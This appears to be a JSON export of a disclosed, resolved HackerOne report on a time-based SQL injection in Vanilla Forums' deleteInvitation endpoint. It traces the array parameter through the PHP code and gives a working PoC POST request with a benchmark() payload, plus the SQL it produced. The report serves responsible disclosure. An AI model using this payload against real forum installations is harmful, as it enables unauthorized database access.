@@ -1,0 +1,340 @@
+{
+  "id": 353784,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTM3ODQ=",
+  "url": "https://hackerone.com/reports/353784",
+  "title": "Vanilla SQL Injection Vulnerability",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-05-18T04:59:35.419Z",
+  "submitted_at": "2018-05-18T04:59:35.419Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "balis0ng",
+    "url": "/balis0ng",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/129/870/f7fae9533c89d599194353645d3b027d33ad8c77_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17443,
+    "url": "https://hackerone.com/vanilla",
+    "handle": "vanilla",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Vanilla",
+      "twitter_handle": "vanilla",
+      "website": "http://vanillaforums.com",
+      "about": "Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-08-17T06:06:05.161Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-07-18T06:05:51.080Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nThere is a SQL injection vulnerability in the vanilla, an attacker can use this vulnerability to obtain database information.\n**Description:**\nWe download the program from https://github.com/vanilla/vanilla and install.\nIn applications/dashboard/controllers/class.profilecontroller.php:274\n```php\npublic function deleteInvitation($invitationID) {\n        $this->permission('Garden.SignIn.Allow');\n\n        if (!$this->Form->authenticatedPostBack()) {\n            throw forbiddenException('GET');\n        }\n\n        $invitationModel = new InvitationModel();\n        $invitationModel->delete($invitationID);\n        $this->informMessage(t('The invitation was removed successfully.'));\n        $this->jsonTarget(\".js-invitation[data-id=\\\"{$invitationID}\\\"]\", '', 'SlideUp');\n\n        $this->render('Blank', 'Utility');\n    }\n```\nThe value of this $invitationID is controllable by us. It is worth noting: it can be an array。\nYou can see that the value of $invitationID was brought into the delete function.\napplications/dashboard/models/class.invitationmodel.php:225\n```php\n    public function delete($where = [], $options = []) {\n        if (is_numeric($where)) {\n            deprecated('InvitationModel->delete(int)', 'InvitationModel->deleteID(int)');\n            $result = $this->deleteID($where, $options);\n            return $result;\n        }\n        parent::delete($where, $options);\n    }\n```\nThe $where parameter of this function is controllable by us. It was brought into the delete function and we traced it.\n```php\n public function delete($where = [], $options = []) {\n        if (is_numeric($where)) {\n            deprecated('Gdn_Model->delete(int)', 'Gdn_Model->deleteID()');\n            $where = [$this->PrimaryKey => $where];\n        }\n\n        $resetData = false;\n        if ($options === true || val('reset', $options)) {\n            deprecated('Gdn_Model->delete() with reset true');\n            $resetData = true;\n        } elseif (is_numeric($options)) {\n            deprecated('The $limit parameter is deprecated in Gdn_Model->delete(). Use the limit option.');\n            $limit = $options;\n        } else {\n            $options += ['rest' => true, 'limit' => null];\n            $limit = $options['limit'];\n        }\n\n        if ($resetData) {\n            $result = $this->SQL->delete($this->Name, $where, $limit);\n        } else {\n            $result = $this->SQL->noReset()->delete($this->Name, $where, $limit);\n        }\n        return $result;\n    }\n```\nThe $where parameter was brought into $result = $this->SQL->noReset()->delete($this->Name, $where, $limit);\ntraced it:\nlibrary/database/class.sqldriver.php:333\n```php\n    public function delete($table = '', $where = '', $limit = false) {\n        if ($table == '') {\n            if (!isset($this->_Froms[0])) {\n                return false;\n            }\n\n            $table = $this->_Froms[0];\n        } elseif (is_array($table)) {\n            foreach ($table as $t) {\n                $this->delete($t, $where, $limit, false);\n            }\n            return;\n        } else {\n            $table = $this->escapeIdentifier($this->Database->DatabasePrefix.$table);\n        }\n\n        if ($where != '') {\n            $this->where($where);\n        }\n\n        if ($limit !== false) {\n            $this->limit($limit);\n        }\n\n        if (count($this->_Wheres) == 0) {\n            return false;\n        }\n\n        $sql = $this->getDelete($table, $this->_Wheres, $this->_Limit);\n\n        return $this->query($sql, 'delete');\n    }\n```\nThe $where parameter was brought into $this->where function\n```php\n   public function where($field, $value = null, $escapeFieldSql = true, $escapeValueSql = true) {\n        if (!is_array($field)) {\n            $field = [$field => $value];\n        }\n\n        foreach ($field as $subField => $subValue) {\n            if (is_array($subValue)) {\n                if (count($subValue) == 1) {\n                    $firstVal = reset($subValue);\n                    $this->where($subField, $firstVal);\n                } else {\n                    $this->whereIn($subField, $subValue);\n                }\n            } else {\n                $whereExpr = $this->conditionExpr($subField, $subValue, $escapeFieldSql, $escapeValueSql);\n                if (strlen($whereExpr) > 0) {\n                    $this->_where($whereExpr);\n                }\n            }\n        }\n        return $this;\n    }\n```\nAs mentioned above, the value of $where is controllable by us and can be an array.\nThis means that we can control the field name in the where statement.\nSo we can fill in the field name in the SQL injection statement.\nFollow-up operation will not say much.\n## Steps to reproduce:\n1.The exploit requires users to log in. We can log in as an ordinary user.\n2.The POST method is required to access the deleteInvitation function. Due to the existence of the TransientKey, we cannot directly send a POST request.But we can get TransientKey by other means. For example, grab a normal POST message and change it to a vulnerability URL.\n3.Here I use delay injection, using the benchmark function in mysql. Different environment delay time is not the same.\n##The poc:\n```\nPOST /profile/deleteInvitation?invitationID[1%3dbenchmark(40000000,sha(1))+and+1]=balisong HTTP/1.1\nHost: localhost\nContent-Length: 29\nPragma: no-cache\nCache-Control: no-cache\nAccept: application/json, text/javascript, */*; q=0.01\nOrigin: http://localhost\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: http://localhost/profile/\nAccept-Language: zh-CN,zh;q=0.9\nCookie: Drupal.toolbar.collapsed=0; hd_sid=udVsUw; XDEBUG_SESSION=PHPSTORM; Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MjkyMDE2NTAsImlhdCI6MTUyNjYwOTY1MCwic3ViIjo3fQ.of1gk2CHyzeomQNSMWz_8WXXi_FfCwKxyctVWZlemKI; Vanilla-Vv=1526609650; Vanilla-tk=caEyM0dSVZC0xDhU%3A7%3A1526609650%3Ab23a6efff2dd9f026ffa87db10ba4119\nConnection: close\n\nTransientKey=caEyM0dSVZC0xDhU\n\n```\nDelayed 9s on my own machine。\nas the picture shows:\nF298931\n## Anything else we should know?\n\n## Impact\n\nan attacker can use this vulnerability to obtain database information.\n\nThe hacker selected the **SQL Injection** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**Verified**\nYes\n\n**What exploitation technique did you utilize?**\nTime delay\n\n**Please describe the results of your verification attempt.**\nobserved a 9+ second time delay\n\n",
+  "bounty_amount": "600.0",
+  "formatted_bounty": "$600",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 298931,
+      "file_name": "1.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/298/931/e568b8efb2b47d632aeeb6f2a76b56f23ed96739/1.jpg?response-content-disposition=attachment%3B%20filename%3D%221.jpg%22%3B%20filename%2A%3DUTF-8%27%271.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075001Z&X-Amz-Expires=1391&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=eb32a68a0a1ad38a3ebc6da75a61495872918450ff7876dce3e42c2ebcc76aca",
+      "file_size": 111453,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-08-17T06:05:51.196Z",
+  "allow_singular_disclosure_after": -160969450.72341046,
+  "singular_disclosure_allowed": true,
+  "vote_count": 44,
+  "voters": [
+    "cdl",
+    "muon4",
+    "kedrischh",
+    "spam404",
+    "ali",
+    "shazadsadiq",
+    "flashdisk",
+    "balis0ng",
+    "ahiezer",
+    "aryan2808",
+    "and 34 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2101,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.vanillaforums.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 2759633,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "The complete SQL executed in the database is as follows:\n**delete  from GDN_Invitation where 1=benchmark(40000000,sha(1)) and 1 = 'balisong'**\nMore intuitive to see that we have successfully injected SQL statements",
+      "automated_response": false,
+      "created_at": "2018-05-18T05:03:58.332Z",
+      "updated_at": "2018-05-18T05:03:58.332Z",
+      "actor": {
+        "username": "balis0ng",
+        "cleared": false,
+        "verified": false,
+        "url": "/balis0ng",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/129/870/f7fae9533c89d599194353645d3b027d33ad8c77_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 2766846,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the detailed report. We'll triage this with priority by the end of Monday. I expect it will be patched by the end of the week (I'm assuming we'll be able to reproduce it based on your notes).",
+      "automated_response": false,
+      "created_at": "2018-05-19T21:59:04.864Z",
+      "updated_at": "2018-05-19T21:59:04.864Z",
+      "actor": {
+        "username": "linc",
+        "cleared": false,
+        "verified": false,
+        "url": "/linc",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 2768335,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hi there. This report has been triaged as a legitimate exploit and has been triaged. Thank you.",
+      "automated_response": false,
+      "created_at": "2018-05-20T11:53:18.458Z",
+      "updated_at": "2018-05-20T11:53:18.458Z",
+      "actor": {
+        "username": "dexterr",
+        "cleared": false,
+        "verified": false,
+        "url": "/dexterr",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/201/201/11a7da9d5256f50a86acdf6a8f3366252baee73e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 2768762,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-05-20T15:45:31.871Z",
+      "updated_at": "2018-05-20T15:45:31.871Z",
+      "actor": {
+        "url": "/vanilla",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Vanilla"
+        }
+      },
+      "bounty_amount": "600.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "vanilla",
+      "collaborator": {
+        "username": "balis0ng",
+        "url": "/balis0ng"
+      }
+    },
+    {
+      "id": 2787219,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Closing this report as resolved.",
+      "automated_response": false,
+      "created_at": "2018-05-23T16:40:12.895Z",
+      "updated_at": "2018-05-23T16:40:12.895Z",
+      "actor": {
+        "username": "dexterr",
+        "cleared": false,
+        "verified": false,
+        "url": "/dexterr",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/201/201/11a7da9d5256f50a86acdf6a8f3366252baee73e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "balis0ng",
+        "url": "/balis0ng"
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3060423,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-07-18T06:05:51.138Z",
+      "updated_at": "2018-07-18T06:05:51.138Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "balis0ng",
+        "cleared": false,
+        "verified": false,
+        "url": "/balis0ng",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/129/870/f7fae9533c89d599194353645d3b027d33ad8c77_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3207275,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-08-17T06:06:05.195Z",
+      "updated_at": "2018-08-17T06:06:05.195Z",
+      "actor": {
+        "url": "/vanilla",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Vanilla"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 9593,
+      "category": "researcher",
+      "content": "Because the value of invitationID is controlled by the attacker, an attacker can construct an array and perform SQL injection.\nCredit: ADLab of Venustech",
+      "user": {
+        "id": 129870,
+        "username": "balis0ng",
+        "name": "Balis0ng",
+        "bio": "Twitter@Balis0nghack",
+        "cleared": false,
+        "verified": false,
+        "website": "http://balis0ng.com",
+        "location": "",
+        "created_at": "2016-12-10T15:51:19.338Z",
+        "url": "https://hackerone.com/balis0ng",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/129/870/f7fae9533c89d599194353645d3b027d33ad8c77_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/129/870/f7fae9533c89d599194353645d3b027d33ad8c77_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/129/870/f7fae9533c89d599194353645d3b027d33ad8c77_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    }
+  ]
+}
